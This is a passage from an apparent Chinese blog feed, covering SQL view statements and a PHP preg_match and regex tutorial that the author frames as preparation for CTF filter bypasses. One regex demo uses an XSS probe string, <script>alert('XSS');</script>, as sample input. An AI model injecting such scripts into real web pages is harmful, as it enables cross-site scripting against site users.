data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203225330680.png\" alt=\"image-20221203225330680\"></p>\n</li>\n</ul>\n</li>\n<li><p>基于视图</p>\n<p><code>建立计算机系选修了1号课程且成绩在90分以上的学生的视图</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">VIEW</span> SC_Student2 <span class=\"token keyword\">AS</span> <span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> SC_Student1 <span class=\"token keyword\">where</span> Student<span class=\"token punctuation\">.</span>Grade<span class=\"token operator\">>=</span><span class=\"token number\">90</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</li>\n<li><p>带表达式的视图</p>\n<p><code>定义一个反应学生出生年份的视图</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">create</span> <span class=\"token keyword\">VIEW</span> BT_S<span class=\"token punctuation\">(</span>Sno<span class=\"token punctuation\">,</span>Sname<span class=\"token punctuation\">,</span>Sbirth<span class=\"token punctuation\">)</span> <span class=\"token keyword\">AS</span> <span class=\"token keyword\">select</span> Sno<span class=\"token punctuation\">,</span>Sname<span class=\"token punctuation\">,</span><span class=\"token number\">2022</span><span class=\"token operator\">-</span>Sage <span class=\"token keyword\">FROM</span> Student<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203231530346.png\" alt=\"image-20221203231530346\"></p>\n</li>\n<li><p>分组视图</p>\n<p><code>将学生的学号及他的平均成绩定义为一个视图</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">VIEW</span> S_G<span class=\"token punctuation\">(</span>Sno<span class=\"token punctuation\">,</span>Gavg<span class=\"token punctuation\">)</span> <span class=\"token keyword\">AS</span> <span class=\"token keyword\">SELECT</span> Sno<span class=\"token punctuation\">,</span><span class=\"token function\">Avg</span><span class=\"token punctuation\">(</span>Grade<span class=\"token punctuation\">)</span> <span class=\"token keyword\">FROM</span> SC <span class=\"token keyword\">GROUP</span> <span class=\"token keyword\">BY</span> Sno<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203231831066.png\" alt=\"image-20221203231831066\"></p>\n</li>\n<li><p>删除视图</p>\n<p>语句格式：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">DROP</span> <span class=\"token keyword\">VIEW</span> <span class=\"token operator\">&lt;</span>视图名<span class=\"token operator\">></span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><code>删除视图BT_S</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">DROP</span> <span class=\"token keyword\">VIEW</span> BT_S<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203232031229.png\" alt=\"image-20221203232031229\"></p>\n</li>\n</ol>\n<h3 id=\"查询视图\"><a href=\"#查询视图\" class=\"headerlink\" title=\"查询视图\"></a>查询视图</h3><p>用户角度：查询视图与查询基本表相同 </p>\n<p><code>在计算机系学生的视图中找到年龄小于22岁的学生</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> Sno<span class=\"token punctuation\">,</span>Sage <span class=\"token keyword\">FROM</span> CS_Student <span class=\"token keyword\">WHERE</span> Sage<span class=\"token operator\">&lt;=</span><span class=\"token number\">22</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203232531066.png\" alt=\"image-20221203232531066\"></p>\n<h3 id=\"更新视图\"><a href=\"#更新视图\" class=\"headerlink\" title=\"更新视图\"></a>更新视图</h3><p><code>操作计算机系学生视图CS_Student,并将学号201215122的学生姓名改为“刘辰”</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">UPDATE</span> CS_Student <span class=\"token keyword\">SET</span> Sname<span class=\"token operator\">=</span><span class=\"token string\">'刘辰'</span> <span class=\"token keyword\">WHERE</span> Sno<span class=\"token operator\">=</span><span class=\"token string\">'201215122'</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203232829223.png\" alt=\"image-20221203232829223\"></p>\n<h3 id=\"视图的作用\"><a href=\"#视图的作用\" class=\"headerlink\" title=\"视图的作用\"></a>视图的作用</h3><ol>\n<li>视图能够简化用户的操作 </li>\n<li>视图使用户能以多种角度看待同一数据  </li>\n<li>视图对重构数据库提供了一定程度的逻辑独立性  </li>\n<li>视图能够对机密数据提供安全保护 </li>\n<li>适当的利用视图可以更清晰的表达查询</li>\n</ol>\n",
            "tags": [
                "关系数据库",
                "数据库"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/11/09/preg_match&&%E6%AD%A3%E5%88%99/",
            "url": "https://blog.xcu.icu/2022/11/09/preg_match&&%E6%AD%A3%E5%88%99/",
            "title": "preg_match&&正则",
            "date_published": "2022-11-08T16:00:00.000Z",
            "content_html": "<h3 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h3>\n<p>本篇主要用于记录正则表达式和 preg_match 函数的绕过</p>\n<h3 id=\"preg_match函数\"><a class=\"anchor\" href=\"#preg_match函数\">#</a> preg_match 函数</h3>\n<p>这个函数可以用来进行字符串规则的匹配，这个函数也是在 ctf 中经常会遇到的一个函数</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">preg_match</span> <span class=\"token punctuation\">(</span> <span class=\"token keyword type-hint\">string</span> <span class=\"token variable\">$pattern</span> <span class=\"token punctuation\">,</span> <span class=\"token keyword type-hint\">string</span> <span class=\"token variable\">$subject</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span> <span class=\"token keyword type-declaration\">array</span> <span class=\"token operator\">&amp;</span><span class=\"token variable\">$matches</span>  <span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>preg_match_all () - 执行一个全局正则表达式匹配</p>\n<ul>\n<li>$pattern 是匹配规则</li>\n<li>$subjec 是被匹配的字符串</li>\n<li>$matches 提供一个存放匹配结果的数组</li>\n</ul>\n<p>demo:</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"hello php\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/php/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108192842127.png\" alt=\"image-20221108192842127\" /></p>\n<h3 id=\"正则表达式\"><a class=\"anchor\" href=\"#正则表达式\">#</a> 正则表达式</h3>\n<p>简单的使用方法，接下来开始聊正则表达式，或许你没写过，但是你肯定用过类似的正则，必然 Linux 中的？* 匹配字符，那么接下来就是无聊的记忆的知识了</p>\n<p>来一个简单的例子</p>\n<p><sup class=\"footnote-ref\"><a href=\"#fn1\" id=\"fnref1\">[1]</a></sup>+abc$</p>\n<ol>\n<li>^ 是匹配输入字符串的位置</li>\n<li>[0-9]+ 是匹配多个数字，[0-9] 匹配一个数字，+ 是匹配一个或者多个。</li>\n<li>abc 匹配字母 abc 并以 abc 结尾，$ 为匹配目标字符串的结束位置</li>\n</ol>\n<h3 id=\"语法\"><a class=\"anchor\" href=\"#语法\">#</a> 语法</h3>\n<p>首先看一看我们常用到的几个匹配符号</p>\n<ul>\n<li>\n<ul>\n<li></li>\n</ul>\n<p>比如说 ph+p，这里 + 代表前面的 h 至少出现一次，也就是说可以匹配到 php、phhp、phhhp 等等</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"pp php phhp phhhp\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/ph+p/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>这里的 preg_match_all 可以匹配到被匹配字符串的所有符合项，而 preg_match 匹配到第一个就结束了</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108200557709.png\" alt=\"image-20221108200557709\" /></p>\n</li>\n<li>\n<ul>\n<li></li>\n</ul>\n<p>还是 ph*p 这里是指前面的字符出现任意次，也就是说可以为空，pp、php、phhpd 等等</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"pp php phhp phhhp\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/ph*p/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108200633268.png\" alt=\"image-20221108200633268\" /></p>\n</li>\n<li>\n<p>？</p>\n<p>可以这里还是 ph?p，这里指可以出现一次或者零次</p>\n<p>，pp、php</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"pp php phhp phhhp\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/ph?p/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108200704240.png\" alt=\"image-20221108200704240\" /></p>\n</li>\n<li>\n<p>[] 用来限制规则，比如说 [a-z] 就是匹配所有的小写字母</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"test 129\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[a-z0-3]/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108200823705.png\" alt=\"image-20221108200823705\" /></p>\n</li>\n<li>\n<p>{} 用来限制期望字符数，{2-5} 就是指可以有 2-5 个字符长度（这里点不算是一个字符）</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"abaaab\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/a&#123;2&#125;/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108200925429.png\" alt=\"image-20221108200925429\" /></p>\n</li>\n<li>\n<p>(.) 用来匹配所有字符，如果项匹配。可以用 []</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"1a\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/(.)/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108201351042.png\" alt=\"image-20221108201351042\" /></p>\n</li>\n</ul>\n<h3 id=\"普通字符\"><a class=\"anchor\" href=\"#普通字符\">#</a> 普通字符</h3>\n<p>这里的普通字符就是指常见的字符，包括所有大小写字母和数字以及一些符号</p>\n<ol>\n<li>\n<p>上面已经提到 [] 的使用，一般形式匹配 [flag]</p>\n</li>\n<li>\n<p>[^flag] 是指匹配除了 flag 以外的所有字符</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"1f2lxz\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[^flag]/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108203623635.png\" alt=\"image-20221108203623635\" /></p>\n</li>\n<li>\n<p>单独一个点会匹配出来换行符以外的任何一个字符</p>\n</li>\n<li>\n<p>[\\s\\S] 这里 \\s 是匹配所有空白字符 \\S 是匹配所有的非空白符，不包括换行</p>\n</li>\n<li>\n<p>\\w 这个等价于 [a-zA-Z0-9_]</p>\n</li>\n<li>\n<p>在正则中有一个？使用的很多，这里单独再记录一下</p>\n<p>如果想匹配表单中的内容我们直接写 /&lt;.*&gt;/ 这样会匹配全部内容</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"&lt;h1>&lt;script>alert('XSS');&lt;/script>&lt;/h1>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/&lt;.*>/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108204454412.png\" alt=\"image-20221108204454412\" /></p>\n<p>但是我们如果只想知道都使用了什么标签改怎么办呢，这里就可以只用？</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"&lt;h1>&lt;script>alert('XSS');&lt;/script>&lt;/h1>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/&lt;.*?>/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108204606363.png\" alt=\"image-20221108204606363\" /></p>\n</li>\n</ol>\n<h3 id=\"定位符\"><a class=\"anchor\" href=\"#定位符\">#</a> 定位符</h3>\n<ul>\n<li>\n<p>^</p>\n<p>从开头开始匹配</p>\n</li>\n<li>\n<p>$</p>\n<p>匹配到结尾位置，常与 ^ 一起使用只匹配一行</p>\n</li>\n<li>\n<p>\\b</p>\n<p>匹配一个单词的边界</p>\n</li>\n<li>\n<p>\\B</p>\n<p>匹配一个非边界</p>\n</li>\n</ul>\n<p>可能上面简短的几句看起来会很懵，我知道你很急，但你别急，接下来简单的做一些测试</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"test1\ntest2\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/^test123/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108213340067.png\" alt=\"image-20221108213340067\" /></p>\n<p>如果待匹配开头没有则不能成功匹配</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"1test1\ntest2\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/^test/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108213541566.png\" alt=\"image-20221108213541566\" /></p>\n<p>然后来试一下 ^ 的作用</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"test1\ntest2\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/^\\w&#123;1，109&#125;/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108212503702.png\" alt=\"image-20221108212503702\" /></p>\n<p>这里 ^ 从开始位置匹配，但是不会匹配到 \\n 以后的内容</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"test1\ntest2\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\w&#123;1,100&#125;$/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108212605604.png\" alt=\"image-20221108212605604\" /></p>\n<p>从末尾匹配但是不会匹配 \\n 之前的内容</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"test1\ntest2\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/^\\w&#123;1,100&#125;$/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108213846413.png\" alt=\"image-20221108213846413\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108214404871.png\" alt=\"image-20221108214404871\" /></p>\n<p>当两个符号一起使用时只匹配第一行，有 \\n 不会匹配</p>\n<p>补充：这里进行对照排除 \\w 模式的影响</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108214825884.png\" alt=\"image-20221108214825884\" /></p>\n<h3 id=\"修饰符\"><a class=\"anchor\" href=\"#修饰符\">#</a> 修饰符</h3>\n<p>对于 preg_mach 我跟喜欢称其为模式</p>\n<ul>\n<li>\n<p>i 不区分大小写</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"abc ABC\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/abc/i\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108215432175.png\" alt=\"image-20221108215432175\" /></p>\n</li>\n<li>\n<p>g 查找所有的匹配项</p>\n<p>这个就相当于 preg_match_all () 函数</p>\n</li>\n<li>\n<p>m 多行匹配模式</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"a\na\na\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[a-z]/m\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108215756785.png\" alt=\"image-20221108215756785\" /></p>\n</li>\n<li>\n<p>s 使。包含 \\n</p>\n</li>\n</ul>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string 